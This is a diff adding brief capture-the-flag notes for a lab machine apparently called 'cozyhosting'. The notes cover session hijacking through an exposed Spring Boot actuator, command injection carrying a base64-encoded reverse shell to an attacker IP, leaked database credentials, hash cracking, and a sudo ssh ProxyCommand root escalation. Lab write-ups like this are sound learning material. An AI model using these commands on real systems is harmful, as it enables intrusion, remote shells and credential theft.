@@ -1,0 +1,49 @@
+cozyhosting
+
+  based on 404 error it uses java spring(boot)
+  fuzzing with SecLists/Discovery/Web-Content/spring-boot.txt reveals unsecured /actuator
+  
+  /actuator/sessions contains a session token of another user
+  it can be copied into a JSESSIONID cookie
+
+  trying /admin with the new cookie leads to the hosting page
+
+  the inputs of the form on this page are compiled into an ssh command with improper sanitization
+
+  starting nc -l and injecting a shell oneliner with burp gives a shell
+  echo${IFS}YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDQ0ICAwPiYxIA==|base64${IFS}-d|bash
+  first field doesn't matter, second is vulnerable to doing ;oneliner;
+
+  this gives access to user app@cozyhosting
+
+  in /app there's an app binary
+  cloudhosting-0.0.1.jar which can be stolen with nc
+
+  decompiling this gives:
+
+    database name is cozyhosting
+    username=kanderson&password=MRdEQuv6~6P9
+    spring.datasource.username=postgres
+    spring.datasource.password=Vg&nvzAQ7XxR
+
+  forwarding db port with nc and connecting gives:
+    cozyhosting=# select * from users;
+    name    |                           password                           | role  
+    ----------+------------------------------------------------------------+-------
+    kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+    admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+
+  running hashid on the hashes tells it's brypt
+
+  running john with rockyou on the first hash gives password manchesterunited
+
+  ls /home gives user josh
+
+  josh manchesterunited gives access to user.txt
+
+  sudo -l reveals josh can run ssh as root
+
+  sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x from gtfobins gives root shell
+
+  gg
+
